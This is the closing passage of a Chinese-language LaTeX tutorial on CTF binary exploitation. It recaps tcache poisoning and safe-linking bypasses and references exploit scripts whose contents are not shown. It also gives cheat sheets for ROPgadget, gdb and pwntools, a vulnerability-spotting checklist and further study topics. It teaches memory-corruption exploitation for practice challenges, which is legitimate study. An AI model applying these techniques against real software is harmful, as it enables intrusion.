  \item \textbf{tcache poisoning 的完整三步驟}：
        (1) 用 UAF 讀出 \code{fd} 反推 heap；
        (2) 用 UAF 覆寫 \code{fd} 成 \code{PROTECT(target)}；
        (3) 連 \code{malloc} 兩次，第二次就拿到 \code{target}。
        \textbf{這個模板可以套用到九成的 tcache 題。}
  \item \textbf{safe-linking 不是防禦，是「換個方式算」}。
        \code{fd} 依然是可讀可寫的，只是多了 XOR。
        你只要知道「同頁 $\Rightarrow$ \code{>>12} 相同」，就能反推。
  \item \textbf{hexdump 型的 leak 比 \code{\%s} 型的可靠}。
        題目給你 \code{\%s} 就要準備重試；給你 hexdump 就一次到位。
        \textbf{先看清楚 leak 的「通道」是什麼，再決定要不要寫重試。}
\end{enumerate}

\begin{keybox}[五題全部打完了]
回顧整條路線：

\begin{longtable}{@{}p{4.4cm}p{10.6cm}@{}}
\toprule
\textbf{題目} & \textbf{核心觀念}\\
\midrule
\endhead
ret2win & 堆疊溢位、offset = buf + 8、控制 return address\\
weakness & 同型變化、offset 要從 \code{lea} 驗證\\
rop\_demo（附加） & ROP chain、\code{pop rdi ; ret}、16-byte 對齊\\
soul-archive & UAF + type confusion + tcache LIFO 順序\\
soul-vault & 偽造物件、沒有 \code{\%p} 時從 heap 挖 PIE\\
house-of-water & tcache poisoning、flag 就在 heap 上\\
\bottomrule
\end{longtable}

\textbf{你現在手上的武器}：改 return address、組 ROP chain、
看 UAF、算 tcache 順序、poison tcache、偽造物件。
這六招覆蓋了絕大多數入門到中階的 pwn 題。
\end{keybox}

\section{附錄}
\label{chap:appendix}

\subsection{附錄 A：完整腳本（實際跑出 flag 的版本）}

下面每一支都是\textbf{實際執行過、產出前面那些輸出的原檔}，
直接從磁碟讀進來，不是我重打一遍的。要重跑就 \code{python3 檔名.py}。

\subsubsection*{A-1 \file{exp/ret2win.py}}

\lstinputlisting[style=pyfile]{../exp/ret2win.py}

\subsubsection*{A-2 \file{exp/weakness.py}}

\lstinputlisting[style=pyfile]{../exp/weakness.py}

\subsubsection*{A-3 \file{exp/soul\_archive.py}}

\lstinputlisting[style=pyfile]{../exp/soul_archive.py}

\subsubsection*{A-4 \file{exp/soul\_vault.py}}

\lstinputlisting[style=pyfile]{../exp/soul_vault.py}

\subsubsection*{A-5 \file{exp/house\_of\_water.py}}

\lstinputlisting[style=pyfile]{../exp/house_of_water.py}

\subsubsection*{A-6 ROP 教學示範 \file{exp/rop\_demo/rop\_demo.c}}

\lstinputlisting[style=c]{../exp/rop_demo/rop_demo.c}

\subsubsection*{A-7 \file{exp/rop\_demo/rop\_demo.py}}

\lstinputlisting[style=pyfile]{../exp/rop_demo/rop_demo.py}

\subsubsection*{A-8 \file{exp/rop\_demo/align\_demo.py}（16-byte 對齊的對照實驗）}

\lstinputlisting[style=pyfile]{../exp/rop_demo/align_demo.py}

\subsection{附錄 B：指令速查表}

\subsubsection*{B-1 靜態分析}

\begin{lstlisting}[style=sh]
# 防禦機制（pwntools 內建，不必另外裝 checksec）
python3 -c "from pwn import *; print(ELF('chal', checksec=False).checksec())"

# 看符號（函式、全域變數）與位址
nm ./chal | grep -i win
readelf -sW ./chal | grep FUNC

# 反組譯（intel 語法，去掉機器碼比較好讀）
objdump -d -M intel --no-show-raw-insn ./chal | less

# 只看某個函式
objdump -d -M intel --no-show-raw-insn ./chal | sed -n '/<win>:/,/^$/p'

# 找字串 / 找有沒有 /bin/sh
strings -a -t x ./chal | grep -E '/bin/sh|flag'

# 找 gadget（ROP 用）
ROPgadget --binary ./chal --only "pop|ret"
ROPgadget --binary ./chal | grep "pop rdi"

# 找 one_gadget（有 libc 時）
one_gadget ./libc.so.6
\end{lstlisting}

\subsubsection*{B-2 gdb（建議裝 pwndbg 或 gef）}

\begin{lstlisting}[style=sh]
gdb -q ./chal
  # 常見指令（pwndbg 語法，gef 大致相同）
  vmmap                 # 看 PIE / heap / libc / stack 的基底
  p/x &chunks           # 印全域變數位址
  x/8gx &chunks         # 以 8 bytes 為單位 dump
  x/s 0x55555555b2a0    # 當字串讀
  telescope $rax 8      # 一路解指標往下追
  heap chunks           # 列出所有 heap chunk（超好用）
  tcachebins            # 看每個 tcache bin 裡有什麼
  bins                  # 看 unsorted / small / large bins
  break do_malloc
  break *(do_malloc+0xc7)
  p/x $rax
  # 不想手動跑，直接在 pwntools 裡掛
  # gdb.attach(io, 'b *main+0x50')
\end{lstlisting}

\begin{keybox}[\code{heap chunks} 是你的好朋友]
只要在 pwndbg 裡打 \code{heap chunks}，它就會把整個 heap 的 chunk 由下往上列出來，
包括 \code{tcache\_perthread\_struct}、每個 chunk 的位址、size、屬於哪個 bin。
\textbf{第六章那些 \code{0x2a0}/\code{0x290} 的推導，我都是用這一行對答案的。}
\end{keybox}

\subsubsection*{B-3 pwntools 常用片段}

\begin{lstlisting}[style=py]
from pwn import *

io = process('./chal', cwd='./dir')        # 本機
io = remote('host', 1337)                  # 遠端
io = gdb.debug('./chal', 'b *main+0x40')   # 直接開 gdb

io.sendlineafter(b'Choice: ', b'1')        # 等到提示再送（比 sleep 可靠）
io.recvuntil(b'> ')
io.sendafter(b'bytes): ', raw_bytes)       # 不加換行（fread 用）
io.recvrepeat(2)                           # 把剩下的輸出全部收乾淨（拿到 shell 後用）

flat([a, b, c])                            # = p64(a)+p64(b)+p64(c)，還自動對齊
p64(0x40125e) / u64(b'\x5e\x12\x40\0\0\0\0\0')

elf = ELF('./chal', checksec=False)
elf.symbols['win']                         # 符號位址
elf.got['printf'] / elf.plt['system']      # GOT / PLT
libc = ELF('./libc.so.6'); libc.symbols['system']

# 找 offset（cyclic）
io.sendline(cyclic(200))                   # 讓它爆
core = io.corefile                         # 讀 core
offset = cyclic_find(core.read(core.rsp, 4))
\end{lstlisting}

\begin{warnbox}[\code{cyclic\_find} 只適合「確定位址」型的爆掉]
如果程式的 \code{win()} 不存在、你要自己組 ROP，
\textbf{offset 請從反組譯的 \code{lea rax,[rbp-0x??]} 算}（\code{+8} = saved rbp）。
用 cyclic 猜出來的 offset 你事後完全無法解釋，而且換編譯最佳化就錯。
\end{warnbox}

\subsubsection*{B-4 環境修復}

\begin{lstlisting}[style=sh]
# 題目附的 libc/ld 版本不對時，用 patchelf 讓執行檔吃題目附的那一組
patchelf --set-interpreter ./ld-2.35.so --set-rpath . ./chal_patched
# 或一行解決（會自動處理 interpreter + rpath + debug）
pwninit

# 確認 patch 後用的是哪個 libc
ldd ./chal_patched
python3 -c "from pwn import *; print(ELF('./chal_patched',checksec=False).libc)"
\end{lstlisting}

（踩雷過程見第 \ref{sec:toolchain} 節。）

\subsection{附錄 C：Debug 心法與我踩過的雷}

\subsubsection*{C-1 順序：先確認「乾淨地跑」，再打漏洞}

\begin{enumerate}[leftmargin=1.5em,itemsep=2pt]
  \item \textbf{跑起來}：\code{./chal} 能不能正常選單、能不能讀到 flag 檔。
  \item \textbf{看防禦}：\code{checksec}，決定要走 stack 還是 heap。
  \item \textbf{找漏洞}：每個 \code{free} 問「指標清了沒」；每個輸入問「有沒有長度上限」。
  \item \textbf{找 leak}：有沒有 \code{\%p}？沒有就想「heap 上有沒有現成的指標」。
  \item \textbf{算 offset 與順序}：在紙上畫 stack / tcache，再動手。
\end{enumerate}

\subsubsection*{C-2 十個我實際踩過的雷}

\begin{longtable}{@{}p{0.7cm}p{5.4cm}p{8.9cm}@{}}
\toprule
\textbf{\#} & \textbf{症狀} & \textbf{原因與解法}\\
\midrule
\endhead
1 & 蓋了 payload 卻「什麼都沒發生」 & offset 少了 8（忘記 saved rbp）。\textbf{offset = buffer + 8}。\\
2 & chain 位址全對卻 SIGSEGV & 16-byte 對齊。在 chain 前面插一個孤立的 \code{ret} gadget 推 \code{rsp} 8 bytes（第 \ref{chap:rop} 章有會真的爆的示範）。\\
3 & leak 只有 3\textasciitilde4 bytes & \code{printf("\%s")} 被位址中間的 \code{0x00} 截斷。\textbf{這是機率問題}，寫重試迴圈，或改用 hexdump 型 leak。\\
4 & 算出的 base 不是 \code{...000} & offset 猜錯，或抓錯 leak 的來源。\textbf{base 一定 page 對齊}，對不上就是錯。\\
5 & \code{free(): double free detected} & glibc 2.34+ 的 tcache \code{key} 檢查。同一塊不能連兩次 free；要先 \code{malloc} 出來再 free。\\
6 & \code{malloc(): unaligned tcache chunk detected} & poisoning 的 target 不是 16 的倍數。\code{malloc} 回傳的是 \code{chunk+0x10}，target 要對齊 16。\\
7 & 拿到 shell 卻 \code{cat} 不到 flag & \code{cwd} 不對。用 \code{process(BIN, cwd=os.path.dirname(BIN))}。\\
8 & 程式根本跑不起來（\code{GLIBC\_2.34 not found}） & 題目附的 libc/ld 沒被用上。見第 \ref{sec:toolchain} 節。\\
9 & 「選單寫 2 是 A，行為卻是 B」 & 先驗證再說。我實測第四題\textbf{選單文字和行為其實一致}，差點把錯的結論寫進講義。\textbf{任何「怪異行為」都值得再跑一次確認。}\\
10 & 以為 heap 和 PIE 有固定距離 & 沒有。ASLR 讓它們獨立（第 \ref{sec:heap-pie-independent} 節的實測表）。\\
\bottomrule
\end{longtable}

\begin{keybox}[最重要的心法：把「我不知道」變成「我可以量」]
這份講義裡的每一個數字——\code{0x2a0}、\code{0x510}、\code{0x1289}——
都不是背下來的，是\textbf{在 gdb 裡 \code{p/x} 出來的}。
當你卡住時，不要盯著程式碼想，打開 gdb：

\begin{lstlisting}[style=sh]
p/x &chunks          # 這個陣列在哪
x/8gx chunks         # 每一格指到哪
heap chunks          # 整個 heap 長什麼樣
tcachebins           # bin 的頭是誰
\end{lstlisting}

\textbf{看一次勝過想十次。}
\end{keybox}

\subsection{附錄 D：面對新題目的檢查清單}

\begin{longtable}{@{}p{0.7cm}p{13.9cm}@{}}
\toprule
\textbf{勾} & \textbf{檢查項目}\\
\midrule
\endhead
$\square$ & \code{checksec}：Canary / NX / PIE / RELRO 各是什麼？\\
$\square$ & 有沒有 \code{gets}、\code{scanf("\%s")}、\code{read(0,buf,很大)} 之類的\textbf{無上限輸入}？\\
$\square$ & 有沒有「從來沒被呼叫、但會印 flag」的函式？（$\Rightarrow$ ret2win）\\
$\square$ & 有沒有 \code{system}/\code{execve} 的 PLT，或 \code{/bin/sh} 字串？（$\Rightarrow$ 直接叫，不用 ROP）\\
$\square$ & 沒有 \code{/bin/sh}？那能不能寫到 \code{.bss}？（第 \ref{chap:rop} 章的作法）\\
$\square$ & 有 \code{malloc}/\code{free}/\code{edit}/\code{show} 選單？（$\Rightarrow$ heap 題）\\
$\square$ & \textbf{每一個 \code{free}，指標有沒有被設成 NULL？}（沒有 $\Rightarrow$ UAF）\\
$\square$ & 有沒有兩個\textbf{大小相同}的 struct？（$\Rightarrow$ type confusion）\\
$\square$ & 有沒有任何地方印出指標（\code{\%p}）？（$\Rightarrow$ leak PIE / libc / heap）\\
$\square$ & 沒有 \code{\%p}？heap 上有沒有現成的 code pointer 可以當字串偷出來？（第 \ref{chap:vault} 章）\\
$\square$ & 我要寫的目標記憶體，是由\textbf{哪一個 \code{malloc} 的回傳值}決定的？（$\Rightarrow$ 算 tcache 順序）\\
$\square$ & flag 有沒有可能\textbf{本來就在記憶體裡}？（第 \ref{chap:house} 章的作法）\\
\bottomrule
\end{longtable}

\subsection{附錄 E：接下來可以學什麼}

\begin{longtable}{@{}p{3.6cm}p{11.0cm}@{}}
\toprule
\textbf{主題} & \textbf{為什麼要學 / 從哪題開始}\\
\midrule
\endhead
Format string & \code{printf(buf)} 系列。可以直接任意讀寫任意位址，\\
             & 也能一發 leak 出 PIE + libc + stack。非常常見。\\
ret2libc & 沒有現成的 \code{win()}、也沒有 \code{/bin/sh} 時：\\
         & leak libc base $\Rightarrow$ 用 libc 裡的 \code{system} 與 \code{/bin/sh}。\\
Unsorted bin leak & 比 tcache 大的 chunk free 之後，\code{fd}/\code{bk} 會指向\\
                  & \code{main\_arena}（libc 裡）$\Rightarrow$ free 的 libc leak。\\
House of X & 當 tcache poisoning 被防住（例如 pointer guard、\\
           & safe-linking 加上更嚴的檢查）時的替代路徑。\\
           & 從 House of Einherjar、House of Spirit 開始看。\\
FSOP & \code{\_IO\_FILE} 導向攻擊，用來繞過 \code{exit} 或觸發 \code{system}。\\
           & 現代 glibc 的難題，通常是 high-level 題。\\
Kernel pwn & 完全不一樣的世界：\code{ioctl} 介面、\code{cred} 結構、\\
           & \code{modprobe\_path}、\code{userfaultfd}。\\
           & 建議先把 userland heap 練熟再過去。\\
\bottomrule
\end{longtable}

\begin{keybox}[學習路線建議（照這個順序最省力）]
\begin{enumerate}[leftmargin=1.5em,itemsep=2pt]
  \item 把這五題不看講義再打一次（真正自己打，卡住才翻）。
  \item 去打 \textbf{pwnable.tw 的 start / orw}、\textbf{picoCTF} 的 format string 題。
  \item 玩 \textbf{how2heap}（shellphish 的 repo）——
        每一種 heap 技巧都有一支獨立的小程式，跑起來看它怎麼運作。
  \item 上 \textbf{CTFtime} 找最近比賽的 pwn 題，看別人的 writeup 對照。
\end{enumerate}
\end{keybox}

\begin{keybox}[最後一句]
pwn 不是「背技巧」的科目，是\textbf{「讀懂程式的假設，然後違反它」}的科目。

這五題的每一個漏洞，本質上都是同一句話：
\textbf{「程式假設某個指標指向 X，但你可以讓它指向 Y。」}

你現在有六種方法讓它指向 Y。剩下的，就是多打題目，
把「看到什麼形狀 $\Rightarrow$ 想到什麼招」變成本能。
\end{keybox}


\end{document}
